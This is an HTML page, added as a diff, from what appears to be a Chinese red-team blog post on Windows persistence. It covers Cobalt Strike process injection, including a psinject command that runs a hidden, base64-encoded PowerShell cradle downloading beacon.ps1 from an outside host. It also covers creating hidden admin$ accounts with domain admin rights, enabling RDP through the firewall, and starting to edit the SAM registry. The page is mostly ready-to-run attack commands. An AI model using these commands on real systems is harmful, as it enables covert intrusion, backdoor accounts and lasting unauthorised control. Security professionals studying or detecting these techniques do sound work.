@@ -1,0 +1,874 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" href="/img/avatar.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="守心">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="windows进程迁移进程迁移（也叫进程注入）是说当一个程序运行时本身没有一个独立的进程，而是通过相关技术把功能注入到某一个正在运行的进程当中，使运行的程序在进程列表当中无法查看到，这样就起到了利用已存在的进程来隐藏自身进程的作用，并且在权限维持的角度而言也起到了一定的作用。 进程注入是一种广泛使用的躲避检测的技术，通常用于恶意软件或者无文件技术。其需要在另一个进程的地址空间内运行特制代码，进程注">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限维持">
+<meta property="og:url" content="https://liancccc.github.io/2024/09/15/%E6%8A%80%E6%9C%AF/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/index.html">
+<meta property="og:site_name" content="liancccc&#39;s blog">
+<meta property="og:description" content="windows进程迁移进程迁移（也叫进程注入）是说当一个程序运行时本身没有一个独立的进程，而是通过相关技术把功能注入到某一个正在运行的进程当中，使运行的程序在进程列表当中无法查看到，这样就起到了利用已存在的进程来隐藏自身进程的作用，并且在权限维持的角度而言也起到了一定的作用。 进程注入是一种广泛使用的躲避检测的技术，通常用于恶意软件或者无文件技术。其需要在另一个进程的地址空间内运行特制代码，进程注">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429223710526-20241204151421-6jzjra1.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429230450465-20241204151421-aknilzj.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429230530189-20241204151421-aowjc2s.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429230748127-20241204151421-ic2600d.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429230833831-20241204151421-38x837d.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429231819277-20241204151421-uh1ruww.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429231952740-20241204151421-e2nwsjr.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240620153644181-20241204151421-dwby0d0.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505192749107-20241204151421-u044p6x.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505213342154-20241204151421-9wt6of9.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505193356882-20241204151421-p1s2zap.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505193920913-20241204151421-ejp2vin.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505194627217-20241204151421-l777chq.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505194815982-20241204151421-quwanrp.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505194939393-20241204151421-09aztm3.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505195636976-20241204151421-yocw9cs.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505195720748-20241204151421-ez06u10.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505213232075-20241204151421-5vvtpmj.png">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505222517335-20241204151421-ht8od0v.png">
+<meta property="article:published_time" content="2024-09-15T13:23:28.000Z">
+<meta property="article:modified_time" content="2026-04-10T07:38:05.000Z">
+<meta property="article:author" content="守心">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429223710526-20241204151421-6jzjra1.png">
+  
+  
+  
+  <title>权限维持 - liancccc&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/font.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"liancccc.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 50vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>liulipo&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tools/" target="_blank">
+                <i class="iconfont icon-code-fill"></i>
+                <span>Tools</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="http://cateye.us.ci" target="_blank">
+                <i class="iconfont icon-link-fill"></i>
+                <span>CatEye</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/lbxx.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="权限维持"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-15 21:23" pubdate>
+          2024年9月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">权限维持</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>进程迁移（也叫进程注入）是说当一个程序运行时本身没有一个独立的进程，而是通过相关技术把功能注入到某一个正在运行的进程当中，使运行的程序在进程列表当中无法查看到，这样就起到了利用已存在的进程来隐藏自身进程的作用，并且在权限维持的角度而言也起到了一定的作用。</p>
+<p>进程注入是一种广泛使用的躲避检测的技术，通常用于恶意软件或者无文件技术。其需要在另一个进程的地址空间内运行特制代码，进程注入改善了不可见性，同时一些技术也实现了持久性。</p>
+<p>所以说 “进程迁移” 的目的是为了 “隐蔽” 自身，不被发现，从而实现 “权限维持”。</p>
+<p>进程迁移常用于 windows server 版本，因为其通常不容易重启，PC 机则不常用。</p>
+<p>注入的进程通常是 explorer.exe （ 资源管理器 ），或者是其他会一直存在的进程如 web 服务器等。</p>
+<p>进程注入可以分为 2 种形式：</p>
+<ol>
+<li>DLL 注入</li>
+<li>shellcode 注入</li>
+</ol>
+<p>这两种方式没有本质上的区别，在操作系统层面，dll 也是 shellcode 汇编代码。为了开发方便，白帽子常常会将代码以 dll 的形式编译并传播，在实际注入的时候，由注入方或者被注入方调用 loadlibrary 加载。</p>
+<p>CobaltStrike 中的进程迁移：</p>
+<p>名词说明：Post-Exploitation Jobs ( Process Execution + Remote Process Injection )（ 进程执行 + 远程进程注入）</p>
+<p>CobaltStrike 在一些地方产生进程注入的行为。例如它通过 spawn 和 migrate 迁移到一个新的进程。虽然这些是攻击链的重要组成部分，但这些行为都可以由使用者通过 Artifact Kit、Applet Kit 和 Resource Kit 自行控制。这 3 个的具体介绍：</p>
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429223710526-20241204151421-6jzjra1.png" srcset="/img/loading.gif" lazyload alt="image-20240429223710526">​</p>
+<p>Cobalt Strike 的许多 Post-Exploitation Jobs 行为都产生了一个临时过程，将特定的 DLL 注入到该进程，并通过命名管道获取结果。这是进程注入的一个特例。在这些情况下，我们控制临时过程。我们知道这个过程除了我们的进攻行为之外没有任何目的。这使我们可以做更积极的事情。例如，我们可以接管这些临时进程的主线程，而不必担心将其归还。这是在 Cobalt Strike 中配置进程注入时要记住的一个重要细节。</p>
+<p>在 Malleable C2 profile 文件，使用者可以通过配置从而控制 CobaltStirke 中进程注入的一些细节。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">process-inject &#123;<br>    # set remote memory allocation technique<br>    # 设置远程内存分配的技术类型<br>    # 补充说明：NtMapViewOfSection 是一个 ring3 层的未公开函数<br>    set allocator &quot;NtMapViewOfSection&quot;;<br>    # shape the content and properties of what we will inject<br>    # 塑造我们将注入的内容和属性<br>    set min_alloc &quot;16384&quot;;<br>    set userwx &quot;false&quot;;<br>    transform-x86 &#123;<br>    	prepend &quot;\x90&quot;;<br>    &#125;<br>    transform-x64 &#123;<br>    	prepend &quot;\x90&quot;;<br>    &#125;<br>    # specify how we execute code in the remote process<br>    # 指定我们如何在远程进程中执行代码<br>    execute &#123;<br>        CreateThread &quot;ntdll!RtlUserThreadStart&quot;;	#RtlUserThreadStart 函数是线程真正开始执行的地方<br>        CreateThread;<br>        NtQueueApcThread-s;<br>        CreateRemoteThread;<br>        RtlCreateUserThread;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>进程注入的步骤：</p>
+<ol>
+<li>Open a handle to the remote process 打开远程进程的句柄</li>
+<li>Allocate memory in the remote process 在远程进程中分配内存</li>
+<li>Copy the injected data to the remote process 将注入的数据复制到远程进程</li>
+<li>Ask the remote process to execute our injected code 让远程进程执行我们注入的代码</li>
+</ol>
+<p>CobaltStrike 中进程注入的使用：</p>
+<ul>
+<li>inject</li>
+<li>psinject</li>
+</ul>
+<p>命令行查找：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> tasklist /fi <span class="hljs-string">&quot;IMAGENAME eq explorer.exe&quot;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429230450465-20241204151421-aknilzj.png" srcset="/img/loading.gif" lazyload alt="image-20240429230450465">​</p>
+<p>通过 CobaltStrike 的进程列表：</p>
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429230530189-20241204151421-aowjc2s.png" srcset="/img/loading.gif" lazyload alt="image-20240429230530189">​</p>
+<p>使用 inject 注入进程：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">beacon&gt; help <span class="hljs-keyword">inject</span><br>Use: <span class="hljs-keyword">inject</span> [pid] &lt;x86|x64&gt; [listener] <br>Open the process and <span class="hljs-keyword">inject</span> shellcode <span class="hljs-keyword">for</span> the listener<br></code></pre></td></tr></table></figure>
+
+<p>注入进程：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">inject</span> <span class="hljs-number">2068</span> x64 http<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429230748127-20241204151421-ic2600d.png" srcset="/img/loading.gif" lazyload alt="image-20240429230748127">​</p>
+<p>成功上线：</p>
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429230833831-20241204151421-38x837d.png" srcset="/img/loading.gif" lazyload alt="image-20240429230833831">​</p>
+<p>psinject 注入进程：</p>
+<p>psinject 是 cs4.0+版本才出现的，使用的是 one-liner payload 注入进程它向特定进程中注入非托管 PowerShell 并通过其执行指定的命令对于 psinject，x64 进程可以注入 x86&#x2F;x64 的 payload，x86 进程只能注入 x86 。</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">beacon</span>&gt; <span class="hljs-selector-tag">help</span> <span class="hljs-selector-tag">psinject</span><br><span class="hljs-selector-tag">Use</span>: <span class="hljs-selector-tag">psinject</span> <span class="hljs-selector-attr">[pid]</span> <span class="hljs-selector-attr">[arch]</span> <span class="hljs-selector-attr">[commandlet]</span> <span class="hljs-selector-attr">[arguments]</span><br><span class="hljs-selector-tag">Inject</span> <span class="hljs-selector-tag">Unmanaged</span> <span class="hljs-selector-tag">PowerShell</span> <span class="hljs-selector-tag">into</span> <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">specific</span> <span class="hljs-selector-tag">process</span> <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">execute</span> <span class="hljs-selector-tag">the</span><br><span class="hljs-selector-tag">specified</span> <span class="hljs-selector-tag">command</span>. <span class="hljs-selector-tag">Any</span> <span class="hljs-selector-tag">cmdlets</span> <span class="hljs-selector-tag">from</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">last</span> <span class="hljs-selector-tag">use</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">powershell-import</span> <span class="hljs-selector-tag">are</span><br><span class="hljs-selector-tag">available</span> <span class="hljs-selector-tag">here</span> <span class="hljs-selector-tag">too</span>.<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">psinject <span class="hljs-selector-attr">[pid]</span> <span class="hljs-selector-attr">[arch]</span> <span class="hljs-selector-attr">[commandlet]</span> <span class="hljs-selector-attr">[arguments]</span><br>进程 PID 架构位数 命令集 参数<br></code></pre></td></tr></table></figure>
+
+<p>使用 生成一个 powershell 的 payload，然后使用 psinject 去实现注入执行：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">psinject <span class="hljs-number">2068</span> <span class="hljs-keyword">x</span><span class="hljs-number">64</span> powershell -nop -w <span class="hljs-keyword">hidden</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.142.144:8000/beacon.ps1&#x27;))&quot;</span><br><br>psinject <span class="hljs-number">2068</span> <span class="hljs-keyword">x</span><span class="hljs-number">64</span> powershell -nop -exec bypass -EncodedCommand IElFWCAoKG<span class="hljs-number">5</span>ldy<span class="hljs-number">1</span>vYmplY<span class="hljs-number">3</span>QgbmV<span class="hljs-number">0</span>LndlYmNsaWVudCkuZG<span class="hljs-number">93</span>bmxvYWRzdHJpbmcoJ<span class="hljs-number">2</span>h<span class="hljs-number">0</span>dHA<span class="hljs-number">6</span>Ly<span class="hljs-number">8</span><span class="hljs-keyword">x</span><br>OTIuMTY<span class="hljs-number">4</span>LjE<span class="hljs-number">0</span>Mi<span class="hljs-number">4</span>xNDQ<span class="hljs-number">6</span>ODAwMC<span class="hljs-number">9</span>iZWFjb<span class="hljs-number">24</span>ucHMxJykpCg<span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429231819277-20241204151421-uh1ruww.png" srcset="/img/loading.gif" lazyload alt="image-20240429231819277">​</p>
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240429231952740-20241204151421-e2nwsjr.png" srcset="/img/loading.gif" lazyload alt="image-20240429231952740">​</p>
+<p>shinject 的使用：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">beacon&gt; help shinject<br>Use: shinject [pid] &lt;x86|x64&gt; [/path/<span class="hljs-built_in">to</span>/my.bin]<br>Open <span class="hljs-keyword">the</span> <span class="hljs-built_in">process</span> <span class="hljs-keyword">and</span> inject shellcode <span class="hljs-keyword">into</span> <span class="hljs-keyword">it</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">shinject </span>进程 PID 架构位数 <span class="hljs-keyword">shellcode.bin </span>文件的本地路径<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">shinject <span class="hljs-number">2068</span> x64 <span class="hljs-name">C</span>:\Users\Administrator\Desktop\beacon.dll<br></code></pre></td></tr></table></figure>
+
+<p>BOFs 进程注入：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/leftp/BOFs">https://github.com/leftp/BOFs</a></p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/leftp/BOFs<br></code></pre></td></tr></table></figure>
+
+<p>CobaltStrike 导入 syscalls_shinject 和 syscalls_inject 的 cna 插件就行了。</p>
+<p>使用方法：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">syscalls_shinject</span> <span class="hljs-number">1432</span> C:\Users\Administrator\Desktop\beacon.dll<br><span class="hljs-attribute">static_syscalls_inject</span> <span class="hljs-number">1432</span> http<br></code></pre></td></tr></table></figure>
+
+<h3 id="隐蔽账户"><a href="#隐蔽账户" class="headerlink" title="隐蔽账户"></a>隐蔽账户</h3><p>远程登录是单个的，一个用户一个，本地用户正在使用，我们远程连接时候对方就会锁屏，所以还是需要创建新用户。</p>
+<p>但是创建新用户也很出现一个问题，连接后就有连接记录了：</p>
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240620153644181-20241204151421-dwby0d0.png" srcset="/img/loading.gif" lazyload alt="image-20240620153644181">​</p>
+<p>用户名后添加 <code>$</code>​ 符号表示创建隐藏账号：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">net user admin$ QWEasd@123 /add &amp;&amp; net localgroup administrators admin$ /add<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">域用户</span><br>net user admin$ QWEasd@123 /add /domain &amp;&amp; net localgroup administrators admin$ /add<br><br>net group &quot;Domain Admins&quot; username /add /domain<br><br><br>net localgroup administrators /add &lt;DOMAIN&gt;\&lt;USERNAME&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p>开启远程桌面：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1<br><br>reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f<br><br>netstat -an|find &quot;3389&quot;<br></code></pre></td></tr></table></figure>
+
+<p>开启防火墙：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br></code></pre></td></tr></table></figure>
+
+<p>添加用户到远程桌面组：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">添加用户到远程登陆组</span><br>net localgroup &quot;Remote Desktop Users&quot; admin$ /add<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看</span><br>net localgroup &quot;Remote Desktop Users&quot;<br></code></pre></td></tr></table></figure>
+
+<p>全部整理为一行：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> user admin$ QWEasd@<span class="hljs-number">123</span> /add &amp;&amp; <span class="hljs-built_in">net</span> localgroup administrators admin$ /add &amp;&amp; <span class="hljs-built_in">net</span> localgroup &quot;Remote Desktop Users&quot; admin$ /add &amp;&amp; <span class="hljs-built_in">net</span> localgroup &quot;Remote Desktop Users&quot; &amp;&amp; netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> localport=<span class="hljs-number">3389</span> action=allow || wmic RDTOGGLE WHERE ServerName=&#x27;<span class="hljs-variable">%COMPUTERNAME%</span>&#x27; <span class="hljs-keyword">call</span> SetAllowTSConnections <span class="hljs-number">1</span> || reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d <span class="hljs-number">3389</span> /f<br></code></pre></td></tr></table></figure>
+
+<p>创建后使用 <code>net user</code>​ 是无法看到的：</p>
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505192749107-20241204151421-u044p6x.png" srcset="/img/loading.gif" lazyload alt="image-20240505192749107">​</p>
+<p>但是这种情况下，用户注销之后在登录界面是可以看到有这个账户的登录的。</p>
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505213342154-20241204151421-9wt6of9.png" srcset="/img/loading.gif" lazyload alt="image-20240505213342154">​</p>
+<p>对于这种情况可以做进一步的隐藏，具体步骤：</p>
+<ol>
+<li>添加用户</li>
+<li>导出注册表</li>
+<li>删除用户</li>
+<li>导入注册表</li>
+<li>修改注册表</li>
+</ol>
+<blockquote>
+<p>导出注册表</p>
+</blockquote>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">regedit</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">HKEY_LOCAL_MACHINE<span class="hljs-string">\SAM\SAM</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505193356882-20241204151421-p1s2zap.png" srcset="/img/loading.gif" lazyload alt="image-20240505193356882">​</p>
+<p>默认应该是空的，所以需要添加权限（ 我们自己就可以添加 ），点击 SSM 右键权限：</p>
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20240505193920913-20241204151421-ejp2vin.png" srcset="/img/loading.gif" lazyload alt="image-20240505193920913">​</p>
